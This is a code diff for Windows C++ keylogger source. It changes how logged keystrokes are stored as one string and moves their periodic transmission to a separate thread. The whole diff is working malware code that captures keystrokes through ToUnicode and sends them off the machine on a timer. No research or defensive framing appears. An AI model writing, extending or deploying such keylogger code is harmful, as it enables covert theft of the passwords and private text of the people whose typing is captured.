@@ -50,7 +50,7 @@ void Keylogger::Run()
 
 		if (GetTickCount() - ticksLast >= this->sendInterval)
 		{
-			this->Send();
+			this->SendNewThread(&keysPressed);
 			keysPressed.clear();
 
 			if (this->shouldStop)
@@ -84,27 +84,39 @@ void Keylogger::CheckKey(short i)
 		{
 			int ret = ToUnicode(i, 0, this->keysActive, keyBuf, sizeof(keyBuf), 0);
 			if (ret > 0) {
-				keysPressed.push_back(Util::ws2t(keyBuf));
+				keysPressed.append(Util::ws2t(keyBuf));
 			}
 		}
 		else if (str)
 		{
-			keysPressed.push_back(str);
+			keysPressed.append(str);
 		}
 	}
 }
 
-void Keylogger::Send()
+
+typedef struct {
+	Keylogger *keylogger;
+	const std::tstring keys;
+} ProcSend_Data;
+DWORD WINAPI ProcSend(LPVOID lpParameter)
+{
+	ProcSend_Data *data = (ProcSend_Data*) lpParameter;
+	data->keylogger->Send(&data->keys);
+	delete data;
+	return 0;
+}
+
+void Keylogger::SendNewThread(const std::tstring *keys)
+{
+	ProcSend_Data *data = new ProcSend_Data{this, std::tstring(*keys)};
+
+	CreateThread(0, 0xFFFF, ProcSend, data, 0, 0);
+}
+void Keylogger::Send(const std::tstring *keys)
 {
 	std::tstring msgText = _T("d=");
-
-	std::vector<std::tstring>::const_iterator itr;
-	for (   itr = keysPressed.begin();
-			itr != keysPressed.end();
-			itr++)
-	{
-		msgText.append(*itr);
-	}
+	msgText.append(*keys);
 	
 	size_t resp_len;
 	char *resp;
